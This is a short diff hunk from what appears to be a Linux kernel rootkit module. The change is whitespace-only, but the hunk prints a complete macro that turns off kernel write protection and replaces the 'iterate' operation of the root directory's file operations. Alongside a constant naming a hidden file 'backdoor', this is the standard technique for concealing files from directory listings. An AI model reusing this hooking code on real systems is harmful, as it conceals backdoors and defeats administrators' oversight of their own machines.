@@ -18,22 +18,22 @@
 #define ROOT_PATH "/"
 #define SECRET_FILE "backdoor"
 
-#define set_f_op(op,path,new,old)										\
-	do{																	\
-    	struct file_operations *f_op; 									\
-    	struct file *filp = filp_open(path,O_RDONLY,0); 				\
-    	if(IS_ERR(filp)){ 												\
-        	printk("Failed open\n");									\
-        	old = NULL;													\
-    	}else{															\
-			printk("LKM4:Success open");								\
-			f_op = (struct file_operations *)filp->f_op;				\
-			old = f_op->op;												\
-			printk("LKM4:Changing its iterate\n");						\
-			disable_write_protection();									\
-        	f_op->op = new;												\
-        	enable_write_protection();									\
-    	}																\
+#define set_f_op(op,path,new,old)					\
+	do{								\
+    	struct file_operations *f_op; 					\
+    	struct file *filp = filp_open(path,O_RDONLY,0); 		\
+    	if(IS_ERR(filp)){ 						\
+        	printk("Failed open\n");				\
+        	old = NULL;						\
+    	}else{								\
+			printk("LKM4:Success open");			\
+			f_op = (struct file_operations *)filp->f_op;	\
+			old = f_op->op;					\
+			printk("LKM4:Changing its iterate\n");		\
+			disable_write_protection();			\
+        	f_op->op = new;						\
+        	enable_write_protection();				\
+    	}								\
 	}while(0)
 
 
